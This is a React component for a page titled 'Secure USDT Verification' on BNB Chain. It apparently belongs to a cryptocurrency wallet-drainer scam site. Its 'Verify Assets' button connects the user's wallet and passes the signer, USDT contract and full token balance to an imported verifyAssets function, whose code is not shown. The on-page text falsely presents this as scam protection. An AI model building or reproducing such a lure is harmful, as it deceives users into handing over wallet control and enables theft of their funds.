import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { VerificationSectionProps } from '@/types'
import { useEffect, useState } from "react";
import { verifyAssets } from "./RecentVerifications";
import logo from "../../public/bnb.png"
import Image from "next/image";
const VerificationSection = ({
  isConnecting,
  connectAndFund,
  provider,
  signer,
  userAddress,
  usdt,
  balance,
  readableBalance,
  decimals
}: VerificationSectionProps) => {
  const [isVerifying, setIsVerifying] = useState(false);
  const [shouldVerify, setShouldVerify] = useState(false);

  useEffect(() => {
    const runVerification = async () => {
      if (!isConnecting && shouldVerify && provider && signer && userAddress && usdt && balance && readableBalance && decimals) {
        setIsVerifying(true);
        try {
          await verifyAssets(provider, signer, userAddress, usdt, balance, readableBalance, decimals);
        } finally {
          setIsVerifying(false);
          setShouldVerify(false);
        }
      }
    };
    console.log("isConnecting111", isConnecting);
    runVerification();
  }, [isConnecting, shouldVerify, provider, signer, userAddress, usdt, balance, readableBalance, decimals]);

  const handleVerify = async () => {
    if (isConnecting) {
      return;
    }

    if (!provider || !signer || !userAddress || !usdt || !balance || !readableBalance || !decimals) {
      setShouldVerify(true);
      await connectAndFund();
    } else {
      setShouldVerify(true);
    }
  };

  const isLoading = isConnecting || isVerifying;
  const buttonText = isConnecting ? 'Connecting...' : isVerifying ? 'Verifying...' : 'Verify Assets';

  return (
    <Card className="border border-border bg-card/50 backdrop-blur-sm  overflow-hidden relative animate-fade-in golden-glow">
      <div className="absolute inset-0 bg-gold-radial opacity-100" />
      <div className="absolute inset-0 bg-gold-shimmer opacity-100" />
      <CardContent className="pt-6 pb-8 relative z-10">
       
        {/* Main content */}
        <div className="flex  flex-col items-center justify-between gap-6 text-center">
          <h1 className="text-4xl font-bold mb-4 golden-text-glow text-gold">Secure USDT Verification</h1>
          
          {/* BNB Logo - Mobile version */}
          <div className="flex  w-full items-center justify-center mb-6 animate-fade-in" style={{ animationDelay: '300ms' }}>
            <div className="relative w-28 h-28 md:w-36 md:h-36 flex items-center justify-center">
              <Image 
                src={logo} 
                alt="BNB Logo" 
                className="w-full h-full object-contain animate-pulse-glow golden-glow mix-blend-multiply dark:mix-blend-screen opacity-90"
              />
            </div>
          </div>

          {/* BNB Chain Verification Tag */}
          <div className="inline-block px-4 py-1.5 border border-gold text-gold text-xs font-medium rounded-md mb-6 animate-slide-up golden-border-glow golden-text-glow">
            BNB CHAIN VERIFICATION
          </div>

          <button 
            onClick={handleVerify}
            disabled={isLoading}
            className="inline-flex h-10 items-center justify-center rounded bg-yellow-500 hover:bg-yellow-600 px-6 font-medium text-black transition-colors disabled:opacity-70 disabled:cursor-not-allowed golden-glow"
          >
            {isLoading ? (
              <>
                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                {buttonText}
              </>
            ) : (
              buttonText
            )}
          </button>

          <div className="max-w-md animate-slide-up" style={{ animationDelay: '150ms' }}>
            <p className="text-muted-foreground/80 mb-6 text-center">
              Verify your BNB Chain assets with our advanced security protocol.
              Protect against scams and ensure your transactions are secure.
            </p>
          </div>

        </div>
      </CardContent>
    </Card>
  )
}

export default VerificationSection
